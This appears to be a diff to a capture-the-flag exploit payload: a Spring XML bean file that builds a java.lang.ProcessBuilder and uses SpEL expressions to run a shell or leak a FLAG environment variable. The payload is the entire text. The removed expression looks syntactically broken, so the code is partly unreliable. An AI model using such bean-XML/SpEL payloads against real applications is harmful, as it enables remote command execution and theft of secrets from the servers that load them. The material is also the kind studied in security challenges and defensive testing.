@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="/bin/bash" />
-     <property name="whatever" value="#{ throw new IOException(System.getenv("FLAG")) }"/>
+     <constructor-arg value="echo ${FLAG}" />
+     <property name="whatever" value="#{ pb.environment() }"/>
   </bean>
 </beans>
